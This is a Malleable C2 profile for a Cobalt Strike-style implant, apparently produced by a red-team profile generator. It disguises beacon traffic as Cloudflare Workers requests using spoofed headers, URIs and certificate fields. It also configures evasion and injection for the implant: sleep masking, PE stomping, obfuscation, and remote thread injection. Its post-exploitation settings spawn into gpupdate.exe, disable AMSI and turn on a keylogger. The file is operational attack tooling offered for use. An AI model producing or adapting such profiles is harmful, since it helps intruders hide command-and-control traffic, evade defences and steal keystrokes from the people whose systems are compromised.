# =====================================================================
# Profile: Cloudflare Edge Workers & Ray ID - STEALTH
# Generated & Validated by Ostad Red Team Forge Malleable C2 Engine
# Founder & Director: Ostad Rezaul Karim (Top 1% Red Teamer)
# =====================================================================

set sample_name "update_cR4k4N.exe";
set sleeptime "5000";
set jitter "25";
set maxget "1048576";
set data_jitter "13";
set useragent "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15";
set pipename "msagent_##";
set pipename_stager "status_qtbU##";


http-get {
    set uri "/edge/v1/cache/sync" "/cdn-cgi/trace";

    client {
        header "Host" "workers.cloudflare.com";
        header "Accept" "*/*";
        header "Accept-Language" "en-US,en;q=0.5";
        header "CF-Device-Type" "desktop";
        metadata {
            mask;
            base64url;
            prepend "version=";
            header "Cookie";
        }
    }

    server {
        header "Server" "cloudflare";
        header "Content-Type" "application/json";
        header "Cache-Control" "no-cache, no-store, must-revalidate";
        output {
            mask;
            base64;
            print;
        }
    }
}

http-post {
    set uri "/api/v4/graphql" "/cdn-cgi/beacon/performance";
    set verb "POST";

    client {
        header "Host" "workers.cloudflare.com";
        header "Accept-Language" "en-US,en;q=0.5";
        header "CF-Device-Type" "desktop";
        header "Content-Type" "application/json";
        id {
            mask;
            base64url;
            parameter "cid";
        }
        output {
            mask;
            base64url;
            print;
        }
    }

    server {
        header "Server" "cloudflare";
        header "Content-Type" "application/json";
        output {
            mask;
            base64;
            print;
        }
    }
}

stage {
    set checksum "0";
    set cleanup "true";
    set sleep_mask "true";
    set smartinject "true";
    set stomppe "true";
    set obfuscate "true";
    set userwx "false";
    set magic_mz_x86 "MZMM";
    set magic_mz_x64 "MZMM";
    set magic_pe "PI";
    transform-x86 {
        prepend "\x90\x90\x90\x90";
    }
    transform-x64 {
        prepend "\x90\x90\x90\x90";
    }
}

process-inject {
    set allocator "VirtualAllocEx";
    set min_alloc "4096";
    set startrwx "false";
    set userwx "false";
    execute {
        CreateThread;
        SetThreadContext;
        CreateRemoteThread;
        RtlCreateUserThread;
    }
}

post-ex {
    set spawnto_x86 "%windir%\syswow64\gpupdate.exe";
    set spawnto_x64 "%windir%\sysnative\gpupdate.exe";
    set amsi_disable "true";
    set keylogger "GetAsyncKeyState";
}

https-certificate {
    set CN "*.cloudflare.com";
    set O "Cloudflare, Inc.";
    set OU "Edge Security";
    set C "US";
    set ST "California";
    set L "San Francisco";
    set validity "556";
}
